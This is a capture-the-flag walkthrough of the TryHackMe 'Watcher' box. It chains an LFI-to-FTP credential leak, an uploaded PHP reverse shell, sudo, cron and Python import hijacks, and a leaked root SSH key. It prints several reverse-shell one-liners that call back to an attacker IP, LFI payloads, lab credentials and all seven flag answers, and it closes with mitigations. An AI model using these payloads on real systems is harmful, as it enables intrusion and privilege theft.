```
 ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗
 ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║ █╗ ██║███████║   ██║   ██║     ███████║█████╗  ██████╔╝
 ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
             TryHackMe: Watcher
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-18 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~15 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), SSH (22), HTTP (80)
- [x] Feroxbuster: found `flag_1.txt`, `robots.txt`, `secret_file_do_not_read.txt` (403)
- [x] `flag_1.txt` → FLAG 1 via robots.txt disclosure
- [x] LFI on `post.php?post=` confirmed via `/etc/passwd`
- [x] LFI → read `secret_file_do_not_read.txt` → FTP credentials `ftpuser:givemefiles777`
- [x] FTP login as `ftpuser` → retrieved `flag_2.txt` → FLAG 2
- [x] Uploaded PHP reverse shell to `/files/` via FTP
- [x] Triggered shell via LFI path to `/home/ftpuser/ftp/files/php-reverse-shell.php`
- [x] Shell stabilised as `www-data` using `script` fallback
- [x] Found `flag_3.txt` at `/var/www/html/more_secrets_a9f10a/`
- [x] `sudo -l` as `www-data` → can run PHP as `toby`
- [x] Spawned shell as `toby` via `sudo -u toby php -r` reverse shell
- [x] `flag_4.txt` → FLAG 4; `note.txt` hinted at cron jobs
- [x] Modified `~/jobs/cow.sh` (writable by toby, run by cron as `mat`)
- [x] Cron fired → shell as `mat` → FLAG 5
- [x] `sudo -l` as `mat` → can run `will_script.py` as `will`
- [x] `cmd.py` (imported by `will_script.py`) is writable by `mat`
- [x] Overwrote `cmd.py` with Python reverse shell
- [x] Ran `sudo -u will will_script.py` → shell as `will` → FLAG 6
- [x] Found `key.b64` in `/opt/backups/` (adm group readable)
- [x] Decoded Base64 → root RSA private key
- [x] SSH as root → FLAG 7

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🌐 Browser: LFI exploitation
- 📂 FTP client: authenticated file upload and retrieval
- 🐚 Netcat: multiple reverse shell listeners
- 🔑 SSH: root login via extracted private key

---

## ⚡ TL;DR

Six escalation hops from `www-data` to root, each building on the previous: LFI read FTP credentials → FTP shell upload → `www-data` → `sudo php` as `toby` → writable cron script → `mat` → writable Python import module → `will` → base64-encoded root RSA key in `/opt/backups/` → SSH as root. Seven flags distributed across every step of the chain.

---

## 📖 Introduction

Today's target is **Watcher**: a box that earns its medium difficulty rating not through any single clever exploit, but through sheer chain length. Six privilege escalation hops between `www-data` and root, each with a distinct technique: `sudo` to different users, a cron job, Python library hijacking, and a base64-encoded SSH key hiding in a group-readable backup directory. The flags are scattered across every account and directory along the path, turning the box into a scavenger hunt that doubles as a privilege escalation tutorial. Methodical enumeration at each step is the only way through.

### Prerequisites

Readers are assumed to know:

- What LFI is and how `?post=` parameters can read arbitrary files
- How to upload a reverse shell via FTP and trigger it via LFI
- What cron jobs are and why writable cron scripts are dangerous
- How Python's import system works and why a writable imported module is a hijack vector
- What Base64 encoding is and how to decode it on the command line

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.49.154.122 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.5: anonymous blocked |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu): "Corkplacemats" |

Anonymous FTP login rejected immediately. Web server is the primary attack surface.

### Web Directory Enumeration

```bash
feroxbuster -u http://10.49.154.122 \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```
# relevant hits
200  /flag_1.txt                         # ^^^ first flag
403  /secret_file_do_not_read.txt        # ^^^ forbidden: LFI target
200  /robots.txt
200  /post.php                           # ^^^ LFI vector
```

*`robots.txt` contents:*

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

`robots.txt` is explicitly allowing both files: including the one named "do not read." The irony is intentional. `flag_1.txt` is directly readable:

```
FLAG{robots_dot_text_what_is_next}
```

`secret_file_do_not_read.txt` returns 403 directly, but the LFI will handle that.

---

## 🚪 Foothold

*(~8 mins into the box)*

### LFI on `post.php?post=`

The blog posts are loaded via `http://10.49.154.122/post.php?post=striped.php`: a `?post=` parameter feeding a filename directly to PHP's include function.

*Confirming LFI:*

```
http://10.49.154.122/post.php?post=../../../../etc/passwd
```

Full `/etc/passwd` returned. Users identified: `will`, `mat`, `toby`, `ftpuser`.

*Reading the forbidden file via LFI (no HTTP layer to block us now):*

```
http://10.49.154.122/post.php?post=secret_file_do_not_read.txt
```

```
Hi Mat, The credentials for the FTP server are below.
I've set the files to be saved to /home/ftpuser/ftp/files.
Will
----------
ftpuser:givemefiles777
```

FTP credentials and the upload path, gift-wrapped.

### FTP Login → Shell Upload

*Logging in as `ftpuser` and retrieving FLAG 2:*

```bash
ftp 10.49.154.122
# Name: ftpuser   Password: givemefiles777
ftp> get flag_2.txt
```

```
FLAG{ftp_you_and_me}
```

*Uploading PentestMonkey PHP reverse shell to the `/files/` directory:*

```bash
ftp> cd files
ftp> put php-reverse-shell.php
```

*Setting up the listener and triggering via LFI: the LFI includes the uploaded file, executing it as PHP:*

```bash
nc -lnvp 4444
# browser: http://10.49.154.122/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.49.154.122] 47202
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilisation

`python` was not available; using the `script` fallback:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

---

## 🐚 Shell / Access: www-data

*(~15 mins into the box)*

*Home directories accessible but flags inside them all permission-denied for `www-data`. Found FLAG 3 in a hidden web directory:*

```bash
find / 2>/dev/null | grep flag
# /var/www/html/more_secrets_a9f10a/flag_3.txt
```

```bash
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
# FLAG{lfi_what_a_guy}
```

*Checking `www-data`'s sudo permissions:*

```bash
sudo -l
# (toby) NOPASSWD: /usr/bin/php
```

`www-data` can run PHP as `toby` without a password.

---

## 📈 Escalation Chain

### Hop 1: www-data → toby (sudo php)

*Spawning a reverse shell as `toby` via `sudo -u toby php -r`:*

```bash
sudo -u toby php -r '$sock=fsockopen("192.168.134.217",4443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
# new listener
toby@ip-10-49-154-122:/home/will$ cd /home/toby
toby@ip-10-49-154-122:~$ cat flag_4.txt
FLAG{chad_lifestyle}
```

*Reading `note.txt`:*

```
Hi Toby, I've got the cron jobs set up now so don't worry about getting that done.
Mat
```

### Hop 2: toby → mat (cron job hijack)

*Checking `~/jobs/`:*

```bash
ls -lah ~/jobs/cow.sh
# -rwxr-xr-x 1 toby toby 46 Dec 3 2020 cow.sh
# ^^^ owned by toby: writable
```

```bash
cat ~/jobs/cow.sh
# #!/bin/bash
# cp /home/mat/cow.jpg /tmp/cow.jpg
```

A cron job running as `mat` executes this script periodically. `toby` owns it, so `toby` can write to it.

*Appending a reverse shell: the cron fires and `mat` connects back:*

```bash
echo '/bin/bash -i >& /dev/tcp/192.168.134.217/1235 0>&1' >> ~/jobs/cow.sh
```

```
# ~1 minute later on nc -lnvp 1235
mat@ip-10-48-145-47:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
```

### Hop 3: mat → will (Python library hijack)

*Checking `mat`'s sudo permissions:*

```bash
sudo -l
# (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

*Inspecting the script:*

```python
# will_script.py (owned by will, not writable by mat)
import os, sys
from cmd import get_command

cmd = get_command(sys.argv[1])
whitelist = ["ls -lah", "id", "cat /etc/passwd"]
if cmd not in whitelist:
    print("Invalid command!")
    exit()
os.system(cmd)
```

```python
# cmd.py (in same directory, owned by mat: writable)
def get_command(num):
    if(num == "1"): return "ls -lah"
    if(num == "2"): return "id"
    if(num == "3"): return "cat /etc/passwd"
```

**What is a Python library hijack?** When Python executes `from cmd import get_command`, it searches for `cmd` in the current directory before checking system paths. `cmd.py` lives in the same directory as `will_script.py`, and `mat` owns `cmd.py`. Overwriting it with arbitrary Python code means that code runs as `will` when `will_script.py` is invoked via `sudo`.

*Overwriting `cmd.py` with a reverse shell:*

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.217",4442));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cmd.py
```

*Triggering via sudo:*

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

```
will@ip-10-48-145-47:~$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```

### Hop 4: will → root (Base64 SSH key)

*Checking `will`'s group membership:*

```bash
id
# uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

`will` is in the `adm` group: log file access, same as `tim` in Silver Platter. But here the interesting adm-readable file is in `/opt/`:

```bash
find / -group adm 2>/dev/null | grep -v /var/log
# /opt/backups/key.b64
```

*Decoding the Base64 key:*

```bash
cat /opt/backups/key.b64 | base64 -d
# -----BEGIN RSA PRIVATE KEY-----
# MIIEpAIBAAKCAQEAzPaQ...
# -----END RSA PRIVATE KEY-----
```

A root RSA private key, encoded in Base64 and stored in a group-readable directory. Saved locally as `id_rsa`.

*SSH as root:*

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.48.145.47
```

```
root@ip-10-48-145-47:~# cat flag_7.txt
FLAG{who_watches_the_watchers}
```

---

## 💥 Exploitation

The complete seven-hop chain:

1. **Feroxbuster** → `flag_1.txt` via `robots.txt`, LFI on `post.php?post=`
2. **LFI** read `secret_file_do_not_read.txt` → FTP credentials `ftpuser:givemefiles777`
3. **FTP** → `flag_2.txt`; uploaded PHP reverse shell to `/files/`
4. **LFI triggered shell** → `www-data` → `flag_3.txt` in hidden web dir
5. **`sudo php` as `toby`** → `flag_4.txt`; cron note found
6. **Writable `cow.sh`** run as `mat` by cron → `flag_5.txt`
7. **Writable `cmd.py`** imported by `will_script.py` run as `will` → `flag_6.txt`
8. **`adm` group** → `/opt/backups/key.b64` → root RSA key → SSH as root → `flag_7.txt`

---

## 🐇 Rabbit Holes

### `cow.sh` Connection Refused on Manual Run

Running `cow.sh` manually triggered "connection refused" because the Netcat listener wasn't set up yet at that moment. The script itself was correct: it just needed the listener to be active before the cron fired (or before manually running it). Starting `nc -lnvp 1235` first, then waiting for the cron or running the script again, resolved it immediately.

### Python Not Available for Shell Stabilisation

`python -c 'import pty; pty.spawn("/bin/bash")'` failed with "not found": Python 2 is not installed. Python 3 is present but `python3` wasn't tried immediately. The `script` fallback (`/usr/bin/script -qc /bin/bash /dev/null`) worked cleanly without needing any Python at all.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| Flag 1 | `FLAG{robots_dot_text_what_is_next}` | `/flag_1.txt` (via `robots.txt`) |
| Flag 2 | `FLAG{ftp_you_and_me}` | `/home/ftpuser/ftp/flag_2.txt` |
| Flag 3 | `FLAG{lfi_what_a_guy}` | `/var/www/html/more_secrets_a9f10a/flag_3.txt` |
| Flag 4 | `FLAG{chad_lifestyle}` | `/home/toby/flag_4.txt` |
| Flag 5 | `FLAG{live_by_the_cow_die_by_the_cow}` | `/home/mat/flag_5.txt` |
| Flag 6 | `FLAG{but_i_thought_my_script_was_secure}` | `/home/will/flag_6.txt` |
| Flag 7 | `FLAG{who_watches_the_watchers}` | `/root/flag_7.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| LFI via unsanitised `?post=` parameter | Critical | Validate `post` against an explicit allowlist of permitted filenames; never pass user input directly to `include()` |
| FTP credentials stored in a web-accessible file | Critical | Never store credentials in files readable by the web server; use environment variables or a secrets manager |
| FTP upload directory path-traversable via LFI | High | Store FTP uploads outside the webroot entirely; disable PHP execution in upload directories |
| `www-data` granted `sudo php` as `toby` | Critical | PHP can execute arbitrary code: granting it via `sudo` is equivalent to granting a shell |
| Cron script writable by the user it's owned by | Critical | Cron scripts executed as a different user must not be writable by the initiating account; `chmod 755` and `chown mat:mat` |
| `cmd.py` (imported module) writable by `mat` | High | Privileged Python scripts should use absolute imports and ensure all imported modules are in root-owned, non-writable locations |
| Root SSH private key stored in adm-readable directory | Critical | Private keys must be stored in root-only directories (`700`); never in group-readable locations |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Python's import resolution searches the script's local directory before system paths. A writable file in the same directory as a privileged script is a library hijack waiting to happen: even if the script itself is locked down tight. Always ensure every file in a privileged script's directory is owned and writable only by root.

---

## 🔁 If I Did It Again

After landing `www-data`, run `sudo -l` immediately before exploring the filesystem: the `(toby) NOPASSWD: /usr/bin/php` rule is the entire next step and knowing it early focuses the effort. Also set up all three Netcat listeners before starting the escalation chain to avoid the "connection refused because listener wasn't ready" stumble on `cow.sh`.

---

## 🔚 Changelog

*Last updated: 2026-06-18*

---

[↑ Back to top](#)
